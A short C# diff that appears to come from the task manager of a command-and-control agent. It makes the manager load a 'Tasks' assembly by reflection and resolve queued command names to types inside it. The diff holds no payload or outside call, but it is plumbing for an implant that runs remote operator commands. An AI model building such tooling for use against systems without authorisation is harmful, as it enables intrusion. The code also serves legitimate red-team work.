@@ -10,6 +10,8 @@ using ApolloInterop.Enums.ApolloEnums;
 using ApolloInterop.Classes;
 using System.Threading;
 using ThreadingTask = System.Threading.Tasks.Task;
+using AT = Tasks;
+using System.Reflection;
 
 namespace Apollo.Management.Tasks
 {
@@ -38,16 +40,30 @@ namespace Apollo.Management.Tasks
         private ConcurrentQueue<TaskStatus> TaskStatusQueue = new ConcurrentQueue<TaskStatus>();
         private Action _taskConsumerAction;
         private ThreadingTask _mainworker;
+        private Assembly _tasksAsm = null;
         public TaskManager(IAgent agent)
         {
             _agent = agent;
+            AT.Initializer.New();
+            foreach(var asm in Assembly.GetExecutingAssembly().GetReferencedAssemblies())
+            {
+                if (asm.Name == "Tasks")
+                {
+                    _tasksAsm = Assembly.Load(asm);
+                    break;
+                }
+            }
+            if (_tasksAsm == null)
+            {
+                throw new Exception("Could not find loaded tasks assembly.");
+            }
             _taskConsumerAction = () =>
             {
                 while(_agent.IsAlive())
                 {
                     if (TaskQueue.TryDequeue(out Task result))
                     {
-                        Type taskType = Type.GetType($"Tasking.{result.Command}");
+                        Type taskType = _tasksAsm.GetType($"Tasks.{result.Command}");
                         if (taskType == null)
                         {
                             AddTaskResponseToQueue(new TaskResponse()
